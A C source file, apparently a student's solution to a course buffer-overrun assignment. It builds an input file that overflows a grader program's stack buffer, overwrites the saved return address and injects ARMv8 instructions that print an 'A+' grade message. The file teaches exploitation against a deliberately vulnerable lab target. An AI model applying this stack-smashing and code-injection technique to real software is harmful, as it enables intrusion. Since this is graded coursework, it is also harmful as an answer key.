/*--------------------------------------------------------------------*/
/* createdataAplus.c                                                  */
/* Author: David Hovey                                                */
/*--------------------------------------------------------------------*/
/*
   Produces a file called dataAplus which causes the grader
   program (when executed via grader.sh) to print the student's
   (David's) name and the message "A+ is your grade." and thus assign
   an A+.

   The file overflows readString's stack buffer and overwrites
   getName's saved return address (x30) with the address of
   injected machine instructions built via miniassember.
   Those injected instructions:
      - compute the address of the string "A+ is your grade.%c" which
      is placed in the buffer in BSS,
      - load a character into w1 for the trailing newline,
      - branch into main's existing printf call.
   As a result, control flow jumps into our injected code, which
   then uses printf to print the A+ message in normal format.
*/

#include "miniassembler.h"
#include <stdio.h>
#include <string.h>

/*
   main

   Writes a crafted binary file named "dataAplus" which contains:
      - the student's name (null-terminated),
      - padding bytes to maintain alignment,
      - a format string "A+ is your grade.%c" (with terminating
        null byte),
      - three ARMv8 instructions created via the MiniAssembler
        functions (adr, mov, b),
      - additional padding bytes to fill readString's 48-byte
        buffer, and
      - an overwritten return address pointing back into the
        injected instructions.

   The function:
      * Accepts no command-line arguments.
      * Does not read from stdin.
      * Writes binary data only to "dataAplus".
      * Produces no normal output on stdout.
      * Returns 0.
*/
int main() {
    /* User name written at the start of name[] in the BSS. */
    char name[] = "David";

    /* Padding bytes so subsequent data (string/instructions) are aligned. */
    char padding1[] = "gg";

    /*
       Format string that will be used by printf when execution
       jumps into our injected code. It includes:
           "A+ is your grade."
       followed by "%c", so printf will also print a single
       extra character from w1.
    */
    char printString[] = "A+ is your grade.%c";

    /* Assembled instruction: adr x0, printString. */
    unsigned int adrInstr;

    /*
       Assembled instruction: mov w1, 0x0a.
       This loads a character value (0x0a) into w1 that will be
       used to satisfy the "%c" in the format string.
    */
    unsigned int movInstr;

    /*
       Assembled instruction: branch into the printf call site
       inside main so that our format string and arguments are
       passed to printf in the usual way.
    */
    unsigned int bInstr;

    /*
       Final padding bytes to fill up the remaining portion of
       readString's 48-byte buffer after the name, alignment
       padding, format string, and injected instructions.
    */
    char paddingfinal[] = "gggggggg";

    /*
       Overwritten return address: when getName returns, instead
       of going back to main normally, execution jumps to this
       address (0x420074), which points into our injected code
       stored in the name[] buffer.
    */
    long returnAddress = 0x420074;

    /* Open the output file that will contain the crafted input. */
    FILE *psFile = fopen("dataAplus", "w");
    if (!psFile) {
        perror("fopen did not return a valid pointer");
        return 1;
    }

    /*
       Build machine instructions using the MiniAssembler
       functions
    */
    adrInstr = MiniAssembler_adr(0, 0x420060, 0x420074);
    movInstr = MiniAssembler_mov(1, 0x0a);
    bInstr = MiniAssembler_b(0x4008ac, 0x42007c);

    /*----------------------------------------------------------*/
    /* Write the student's name and its terminating null byte.  */
    /* This populates the start of the name[] buffer.           */
    /*----------------------------------------------------------*/
    fwrite(&name, strlen(name) + 1, 1, psFile);

    /*----------------------------------------------------------*/
    /* Write 2 bytes of padding so that the subsequent string   */
    /* and instructions are placed at the intended alignment.   */
    /*----------------------------------------------------------*/
    fwrite(&padding1, strlen(padding1), 1, psFile);

    /*----------------------------------------------------------*/
    /* Write the format string "A+ is your grade.%c" including  */
    /* its terminating null byte. This is what printf will use  */
    /* when we divert control into our injected code.           */
    /*----------------------------------------------------------*/
    fwrite(&printString, strlen(printString)+1, 1, psFile);

    /*----------------------------------------------------------*/
    /* Write the three assembled ARMv8 instructions in order:   */
    /*   adr x0, printString                                    */
    /*   mov w1, 0x0a                                           */
    /*   b   <printf call>                                      */
    /* These bytes become executable code when control jumps    */
    /* into the name[] buffer.                                  */
    /*----------------------------------------------------------*/
    fwrite(&adrInstr, sizeof(int), 1, psFile);
    fwrite(&movInstr, sizeof(int), 1, psFile);
    fwrite(&bInstr, sizeof(int), 1, psFile);

    /*----------------------------------------------------------*/
    /* Write padding bytes to fill out the remainder of the     */
    /* 48-byte local buffer used by readString. This ensures    */
    /* that the next write will land on the saved x30 slot      */
    /* (getName's return address).                              */
    /*----------------------------------------------------------*/
    fwrite(&paddingfinal, strlen(paddingfinal), 1, psFile);

    /*----------------------------------------------------------*/
    /* Overwrite getName's saved return address with the        */
    /* address of our injected instructions (0x420074). When    */
    /* getName returns, execution jumps into name[], executes   */
    /* our adr/mov/b sequence, and eventually calls printf to   */
    /* print "A+ is your grade." using the supplied string.     */
    /*----------------------------------------------------------*/
    fwrite(&returnAddress, sizeof(long), 1, psFile);

    fclose(psFile);

    return 0;
}